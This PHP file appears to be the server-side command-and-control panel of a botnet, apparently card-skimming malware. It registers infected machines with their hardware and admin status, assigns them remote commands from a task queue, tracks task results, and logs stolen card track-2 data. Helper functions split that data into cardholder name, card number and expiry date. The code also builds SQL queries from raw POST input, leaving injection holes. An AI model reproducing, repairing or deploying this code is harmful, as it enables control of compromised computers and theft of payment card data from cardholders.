<?php

include("config.php");

function assign_task($connection, $bot_id)
{
    if ($stmt = $connection->prepare("SELECT id, cmd FROM tasks WHERE status = '0'")) {  // find tasks not running
        $stmt->execute();

        $result = $stmt->get_result();

        while ($task = $result->fetch_assoc()) {
            if ($stmt2 = $connection->prepare('SELECT task_id FROM tasks_finished WHERE bot_id = ? AND task_id = ?')) {
                $stmt2->bind_param('ss', $bot_id, $task['id']);

                $stmt2->execute();

                $result2 = $stmt2->get_result();

                // if we finished the task we're seeking previously, don't assign a new one
                if ($result2->num_rows > 0) {
                    return;
                } else {
                    // if not, assign this task.
                    die($task['cmd']);
                }
            }
        }
    }
}

if (isset($_GET['alive'])) {
    $bot_id = hextostr($_POST['bot_id']);
    $version = hextostr($_POST['version']);
    $bot_os = hextostr($_POST['os']);
    $bot_isAdmin = hextostr($_POST['isAdmin']);
    $bot_ip = get_ip();

    $bot_gpu = hextostr($_POST['gpu']);
    $bot_proc = hextostr($_POST['proc']);
    $bot_arch = hextostr($_POST['arch']);
    $bot_ram = hextostr($_POST['ram']);
    $bot_space = hextostr($_POST['space']);

    //Check if bot already exsists in database.
    if ($stmt = $connection->prepare('SELECT * from bots WHERE bot_uuid=? LIMIT 1')) {
        $stmt->bind_param('s', $bot_id);
        $stmt->execute();

        $result = $stmt->get_result();

        if ($result->num_rows < 1) {
            $location = file_get_contents('http://ipinfo.io/' . $bot_ip . '/country');
            $location = preg_replace('/\s+/', '', $location);

            $data = array($bot_id, $bot_ip, $location, $bot_os, $bot_isAdmin, $version, $bot_gpu, $bot_proc, $bot_arch, $bot_ram, $bot_space);

                 $sql = "INSERT INTO bots (id, bot_uuid, bot_ipv4, bot_location, bot_os, bot_admin, bot_version, bot_gpu, bot_proc, bot_arch, bot_ram, bot_space, bot_lastseen, bot_added) VALUES (NULL, '$bot_id', '$bot_ip', '$location', '$bot_os', '$bot_isAdmin', '$version', '$bot_gpu', '$bot_proc', '$bot_arch', '$bot_ram', '$bot_space', NOW(), NOW())";

            // assign task to bot

            if ($stmt = $connection->prepare($sql)) {
               //     $stmt->bind_param('ssssssssss', $bot_id, $bot_ip, $location, $bot_os, $bot_isAdmin, $version, $bot_gpu, $bot_proc, $bot_arch, $bot_ram, $bot_space);
                

                $stmt->execute();

                assign_task($connection, $bot_id);
            }
        } else {
            $sql = "UPDATE bots SET bot_os = ?, bot_admin = ?, bot_gpu = ?, bot_version = ?, bot_proc = ?, bot_arch = ?, bot_ram = ?, bot_space = ?, bot_lastseen = NOW() WHERE bot_uuid = '$bot_id'";
          if ($stmt = $connection->prepare($sql)) {
                    $stmt->bind_param('ssssssss', $bot_os, $bot_isAdmin, $bot_gpu, $version, $bot_proc, $bot_arch, $bot_ram, $bot_space);


                $stmt->execute();

                assign_task($connection, $bot_id);
            }
			
        }
    }
}

function track2name($track2){
	$stripcontent = trim($track2);
	$replacefirst = strstr($stripcontent, '^');
	$removebeginning = substr($replacefirst, 1);
	$expdate = strstr($removebeginning, '^');
	$final = strstr($removebeginning, '^', true);
	return $final;
}
function track2expdate($expdate){

	$removebeginning = substr($expdate, 1);
	
	 $returnvalue =  $removebeginning[2] . $removebeginning[3] . "/" . $removebeginning[0] . $removebeginning[1];
	 return $returnvalue;
}
function cchandler($track2){
	
	 $finalz = strstr($track2, '^', true);
	 return $removebeginning = substr($finalz, 2);
}

function getip()
{
    $ip = $_SERVER['REMOTE_ADDR'];
    if ($ip) {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED'];
        } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
            $ip = $_SERVER['HTTP_FORWARDED'];
        } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        }
        
        return $ip;
    }
    return '';
}
if (isset($_GET['track'])&& !empty($_POST["trackdata"])) {
	$a = hextostr($_POST["trackdata"]);

		$ip = getip();
		$time = time();
		if($stmt = $connection->prepare("INSERT INTO `logs` (`id`, `track`, `ip`, `time`) VALUES (NULL, '$a', '$ip', '$time')")){
		$stmt->execute();

	}
}
function nice_escape($unescapedString)
{
    if (get_magic_quotes_gpc()) {
        $unescapedString = stripslashes($unescapedString);
    }
    $semiEscapedString = mysql_real_escape_string($unescapedString);
    $escapedString = addcslashes($semiEscapedString, "%_");

    return $escapedString;
}

function nice_output($escapedString)
{
    $patterns = array();
    $patterns[0] = '/\\\%/';
    $patterns[1] = '/\\\_/';
    $replacements = array();
    $replacements[0] = '%';
    $replacements[1] = '_';
    $output = preg_replace($patterns, $replacements, $escapedString);

    return $output;
}

function cleanstring($string)
{
    $done = nice_output(nice_escape($string));

    return $done;
}


function hextostr($hex)
{
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

function update_bot($connection, $bot_id, $task_id, $task_status)
{
    $sql = 'UPDATE bots SET bot_lastseen = NOW() WHERE bot_uuid = ?';

    if ($stmt = $connection->prepare($sql)) {
        $stmt->bind_param('s', $bot_id);

        $stmt->execute();
    }
}

function update_task($connection, $bot_id, $task_id, $task_status) {
    $sql = 'UPDATE tasks SET executed = executed + 1 WHERE id = ?';

    if ($stmt = $connection->prepare($sql)) {
        $stmt->bind_param('d', $task_id);

        $stmt->execute();
    }
}

function finish_task($connection, $bot_id, $task_id, $task_status) {
    $sql = 'INSERT INTO tasks_finished (task_id, bot_id) VALUES (?, ?)';

    if ($stmt = $connection->prepare($sql)) {
        $stmt->bind_param('s', $task_id);
        $stmt->bind_param('s', $bot_id);

        $stmt->execute();
    }
}

function check_task_done($connection, $bot_id, $task_id, $task_status)
{
    if ($stmt = $connection->prepare('SELECT * FROM tasks WHERE id = ?')) {
        $stmt->bind_param('s', $task_id);
        $stmt->execute();

        $result = $stmt->get_result();

        // this will only execute once, while loop is completely unnecessary, sue me

        while ($row = $result->fetch_assoc()) {
            $executed = $row['executed'];
            $limit = $row['maxbots'];

            if ($stmt2 = $connection->prepare('UPDATE tasks SET status = 1 WHERE id = ?')) {
                $stmt2->bind_param('s', $task_id);

                $stmt2->execute();
            }
        }
    }
}

function fail_task($connection, $bot_id, $task_id, $task_status) {
    $sql = 'UPDATE tasks SET failed = failed + 1 WHERE id = ?';

    if ($stmt = $connection->prepare($sql)) {
        $stmt->bind_param('s', $task_id);

        $stmt->execute();
    }
}

if (isset($_GET['command'])) {

	$idfk = $_POST['bot_id'] . $_POST['cmd_id'] . $_POST['cmd_status'];
    $bot_id = $_POST['bot_id'];
    $task_id = $_POST['cmd_id'];
    $task_status = $_POST['cmd_status'];
    if (!$bot_id) {
        die('');
    }

    if ($task_status == "ok") {

        update_bot($connection, $bot_id, $task_id, $task_status);
        update_task($connection, $bot_id, $task_id, $task_status);
        finish_task($connection, $bot_id, $task_id, $task_status);
        check_task_done($connection, $bot_id, $task_id, $task_status);


        //echo "Task Finished";
    } else {

        fail_task($connection, $bot_id, $task_id, $task_status);
        finish_task($connection, $bot_id, $task_id, $task_status);
    }
}
function get_ip()
{
    if (function_exists('apache_request_headers')) {
        $headers = apache_request_headers();
    } else {
        $headers = $_SERVER;
    }
    //Get the forwarded IP if it exists
    if (array_key_exists('X-Forwarded-For', $headers) && filter_var($headers['X-Forwarded-For'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        $the_ip = $headers['X-Forwarded-For'];
    } elseif (array_key_exists('HTTP_X_FORWARDED_FOR', $headers) && filter_var($headers['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)
    ) {
        $the_ip = $headers['HTTP_X_FORWARDED_FOR'];
    } else {

        $the_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);
    }
    return $the_ip;
}